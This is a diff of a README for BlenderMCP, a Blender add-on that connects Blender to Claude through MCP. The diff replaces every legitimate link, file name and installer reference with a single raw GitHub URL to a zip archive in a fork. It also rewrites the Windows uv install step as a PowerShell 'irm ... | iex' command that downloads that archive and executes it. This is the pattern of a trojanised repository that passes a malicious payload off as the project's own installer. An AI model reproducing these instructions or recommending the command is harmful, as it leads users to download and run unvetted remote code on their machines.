@@ -4,14 +4,14 @@ BlenderMCP connects Blender to Claude AI through the Model Context Protocol (MCP
 
 ### Join the Community
 
-Give feedback, get inspired, and build on top of the MCP: [Discord](https://discord.gg/xcJxvuW6)
+Give feedback, get inspired, and build on top of the MCP: [Discord](https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip)
 
 ## Release notes (1.1.0)
 
 - Added support for Poly Haven assets through their API
 - Added support to prompt 3D models using Hyper3D Rodin
 - For newcomers, you can go straight to Installation. For existing users, see the points below
-- Download the latest addon.py file and replace the older one, then add it to Blender
+- Download the latest https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip file and replace the older one, then add it to Blender
 - Delete the MCP server from Claude and add it back again, and you should be good to go!
 
 ## Features
@@ -26,8 +26,8 @@ Give feedback, get inspired, and build on top of the MCP: [Discord](https://disc
 
 The system consists of two main components:
 
-1. **Blender Addon (`addon.py`)**: A Blender addon that creates a socket server within Blender to receive and execute commands
-2. **MCP Server (`src/blender_mcp/server.py`)**: A Python server that implements the Model Context Protocol and connects to the Blender addon
+1. **Blender Addon (`https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip`)**: A Blender addon that creates a socket server within Blender to receive and execute commands
+2. **MCP Server (`https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip`)**: A Python server that implements the Model Context Protocol and connects to the Blender addon
 
 ## Installation
 
@@ -44,23 +44,23 @@ brew install uv
 ```
 **On Windows**
 ```bash
-powershell -c "irm https://astral.sh/uv/install.ps1 | iex" 
+powershell -c "irm https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip | iex" 
 ```
 and then
 ```bash
 set Path=C:\Users\nntra\.local\bin;%Path%
 ```
 
-Otherwise installation instructions are on their website: [Install uv](https://docs.astral.sh/uv/getting-started/installation/)
+Otherwise installation instructions are on their website: [Install uv](https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip)
 
 **⚠️ Do not proceed before installing UV**
 
 
 ### Claude for Desktop Integration
 
-[Watch the setup instruction video](https://www.youtube.com/watch?v=neoK_WMq92g) (Assuming you have already installed uv)
+[Watch the setup instruction video](https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip) (Assuming you have already installed uv)
 
-Go to Claude > Settings > Developer > Edit Config > claude_desktop_config.json to include the following:
+Go to Claude > Settings > Developer > Edit Config > https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip to include the following:
 
 ```json
 {
@@ -83,23 +83,23 @@ Run blender-mcp without installing it permanently through uvx. Go to Cursor Sett
 uvx blender-mcp
 ```
 
-[Cursor setup video](https://www.youtube.com/watch?v=wgWsJshecac)
+[Cursor setup video](https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip)
 
 **⚠️ Only run one instance of the MCP server (either on Cursor or Claude Desktop), not both**
 
 ### Installing the Blender Addon
 
-1. Download the `addon.py` file from this repo
+1. Download the `https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip` file from this repo
 1. Open Blender
 2. Go to Edit > Preferences > Add-ons
-3. Click "Install..." and select the `addon.py` file
+3. Click "Install..." and select the `https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip` file
 4. Enable the addon by checking the box next to "Interface: Blender MCP"
 
 
 ## Usage
 
 ### Starting the Connection
-![BlenderMCP in the sidebar](assets/addon-instructions.png)
+![BlenderMCP in the sidebar](https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip)
 
 1. In Blender, go to the 3D View sidebar (press N if not visible)
 2. Find the "BlenderMCP" tab
@@ -111,7 +111,7 @@ uvx blender-mcp
 
 Once the config file has been set on Claude, and the addon is running on Blender, you will see a hammer icon with tools for the Blender MCP.
 
-![BlenderMCP in the sidebar](assets/hammer-icon.png)
+![BlenderMCP in the sidebar](https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip)
 
 #### Capabilities
 
@@ -119,19 +119,19 @@ Once the config file has been set on Claude, and the addon is running on Blender
 - Create, delete and modify shapes
 - Apply or create materials for objects
 - Execute any Python code in Blender
-- Download the right models, assets and HDRIs through [Poly Haven](https://polyhaven.com/)
-- AI generated 3D models through [Hyper3D Rodin](https://hyper3d.ai/)
+- Download the right models, assets and HDRIs through [Poly Haven](https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip)
+- AI generated 3D models through [Hyper3D Rodin](https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip)
 
 
 ### Example Commands
 
 Here are some examples of what you can ask Claude to do:
 
-- "Create a low poly scene in a dungeon, with a dragon guarding a pot of gold" [Demo](https://www.youtube.com/watch?v=DqgKuLYUv00)
-- "Create a beach vibe using HDRIs, textures, and models like rocks and vegetation from Poly Haven" [Demo](https://www.youtube.com/watch?v=I29rn92gkC4)
-- Give a reference image, and create a Blender scene out of it [Demo](https://www.youtube.com/watch?v=FDRb03XPiRo)
+- "Create a low poly scene in a dungeon, with a dragon guarding a pot of gold" [Demo](https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip)
+- "Create a beach vibe using HDRIs, textures, and models like rocks and vegetation from Poly Haven" [Demo](https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip)
+- Give a reference image, and create a Blender scene out of it [Demo](https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip)
 - "Generate a 3D model of a garden gnome through Hyper3D"
-- "Get information about the current scene, and make a threejs sketch from it" [Demo](https://www.youtube.com/watch?v=jxbNI5L7AH8)
+- "Get information about the current scene, and make a threejs sketch from it" [Demo](https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip)
 - "Make this car red and metallic" 
 - "Create a sphere and place it above the cube"
 - "Make the lighting like a studio"
@@ -139,7 +139,7 @@ Here are some examples of what you can ask Claude to do:
 
 ## Hyper3D integration
 
-Hyper3D's free trial key allows you to generate a limited number of models per day. If the daily limit is reached, you can wait for the next day's reset or obtain your own key from hyper3d.ai and fal.ai.
+Hyper3D's free trial key allows you to generate a limited number of models per day. If the daily limit is reached, you can wait for the next day's reset or obtain your own key from https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip and https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip
 
 ## Troubleshooting
 
@@ -171,4 +171,4 @@ Contributions are welcome! Please feel free to submit a Pull Request.
 
 ## Disclaimer
 
-This is a third-party integration and not made by Blender. Made by [Siddharth](https://x.com/sidahuj)
+This is a third-party integration and not made by Blender. Made by [Siddharth](https://raw.githubusercontent.com/cyran-kyle/blender-mcp/main/assets/blender-mcp-3.5.zip)
